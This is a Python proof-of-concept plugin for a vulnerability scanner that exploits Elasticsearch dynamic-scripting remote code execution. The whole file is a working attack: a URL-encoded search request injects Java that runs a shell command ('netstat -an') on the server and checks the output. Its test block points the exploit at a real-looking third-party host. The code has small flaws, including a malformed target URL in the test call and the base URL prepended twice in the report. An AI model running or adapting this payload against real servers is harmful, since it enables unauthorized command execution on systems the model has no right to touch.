from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  Elasticsearch Remote Code Execution 
Reference :  http://bouk.co/blog/elasticsearch-rce/
             http://javaweb.org/?p=1300
Author    :  NoName
"""

import  re


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = arg[:-1]+"/_search?source=%7B%22size%22:1,%22query%22:%7B%22filtered%22:%7B%22query%22:%7B%22match_all%22:%7B%7D%7D%7D%7D,%22script_fields%22:%7B%22exp%22:%7B%22script%22:%22import%20java.util.*;%5Cnimport%20java.io.*;%5CnString%20str%20=%20%5C%22%5C%22;BufferedReader%20br%20=%20new%20BufferedReader(new%20InputStreamReader(Runtime.getRuntime().exec(%5C%22netstat%20-an%5C%22).getInputStream()));StringBuilder%20sb%20=%20new%20StringBuilder();while((str=br.readLine())!=null)%7Bsb.append(str);%7Dsb.toString();%22%7D%7D%7D"
        code, head, res, errcode, _ = curl.curl(payload)
        if code == 200:
            m = re.search("ESTABLISHED",res)
            if m:
                output(arg[:-1]+payload,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  Elasticsearch Remote Code Execution   Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='Elasticsearch Remote Code Execution  Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/ip/ip_0c14c5c94dd50ece8de9b5f7fc1e2512.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/ip/ip_0c14c5c94dd50ece8de9b5f7fc1e2512.py
#/root/github/poccreate/codesrc/exp-131.py